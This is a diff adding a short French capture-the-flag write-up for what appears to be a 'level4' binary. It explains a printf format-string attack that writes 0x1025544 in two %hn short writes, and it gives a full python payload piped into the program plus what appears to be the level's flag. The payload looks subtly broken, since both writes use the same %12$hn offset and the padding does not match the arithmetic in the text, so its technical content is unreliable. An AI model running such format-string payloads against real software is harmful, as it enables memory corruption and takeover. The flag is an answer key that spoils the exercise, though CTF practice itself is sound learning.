@@ -1,0 +1,27 @@
+Ce programme nous renvoi encore la même chose qu’on lui envoi sur le stdin si on l’exécute.
+
+On lance gdb : en faisant info function on voit qu’il y a 3 fonctions : main, p et n.
+
+Le main appel la fonction principale : n qui lui fait un appel à p qui est juste un printf.
+
+On se rend compte que le principe est le quasiment même que l’exercice précédent à une différence près 
+: la valeur comparée ne peut (normalement) pas être écrite en entière avec printf.
+On doit donc la diviser comme ceci : 0x1025544 -> 0x0102 et 0x5544.
+
+Voilà comment on construit le payload :
+
+0102 = 258 en décimal
+5544 = 21858 en décimal
+
+Étant donné que 0102 < 5544, il faudra mettre 0102 en premier et juste inverser les adresses.
+On a l’adresse à modifier : 0x8049810 et la 2eme 0x8049812 (+2bytes).
+Le format specifier utilisé sera %hn, c’est celui qui permet d’écrire un short value (2 bytes) au lieu 
+d’un int (4 bytes).
+Il faudra donc écrire la 1ere valeur 2 bytes plus loin dans la mémoire.
+On a plus qu’à chercher l’offset comme dans l’exercice précédent pour que le payload soit complet.
+
+python -c ‘print “\x12\x98\x04\x08\x10\x98\x04\x08%250x%12$hn%21570x%12$hn” ‘ > /tmp/payload2 && cat 
+/tmp/payload2 - | ./level4
+
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
